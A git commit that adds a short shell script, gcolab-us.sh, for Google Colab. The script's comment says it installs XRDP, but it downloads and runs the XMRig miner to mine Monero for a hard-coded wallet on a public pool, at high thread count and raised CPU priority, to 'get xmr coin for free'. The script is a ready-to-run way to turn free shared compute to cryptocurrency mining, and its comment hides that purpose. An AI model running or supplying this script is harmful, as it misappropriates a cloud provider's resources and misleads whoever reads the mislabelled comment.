da9fc51d8e2452be8b7f4398273d507471cda4fc
bodinhoblink <39828630+bodinhoblink@users.noreply.github.com>
2022-05-06 22:21:20 -0300

    Create gcolab-us.sh

---
+++ gcolab-us.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
+tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig -a rx/0 -o ca.monero.herominers.com:10191 -u 8BrixK3vTTdPRG92JMdwsefnDpLvzJUST6xf5PQn3iW2PFne3zwVAGhQPoVDx8zY2zG3WE9GvY1djgDB8HXhsg3wHxTCe9e -k --tls -p Threadripper --threads=100 --cpu-priority=5
